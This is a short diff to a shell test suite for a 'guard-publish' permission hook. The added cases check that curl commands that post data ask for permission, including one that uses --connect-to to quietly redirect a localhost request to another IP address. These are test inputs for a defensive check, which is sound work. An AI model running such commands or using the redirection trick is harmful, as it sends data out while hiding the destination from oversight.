@@ -490,5 +490,7 @@ run_hook "$S" "$(jsonin 'curl -X POST -d @msg.json "$WEBHOOK_URL"')"
 assert_out '"permissionDecision":"ask"' "a write to a URL from a variable asks"
 assert_out 'URL from a variable' "the question says the URL is from a variable"
 case "$OUT" in *'passes that argument whole'*) echo "  FAIL [a host question says nothing of a quoted argument]: $OUT"; FAILS=1 ;; esac
+run_hook "$S" "$(jsonin 'curl --connect-to ::203.0.113.5: -d x http://localhost:3000/x')"
+assert_out '"permissionDecision":"ask"' "a write that --connect-to sends elsewhere asks"
 
 finish "guard-publish"
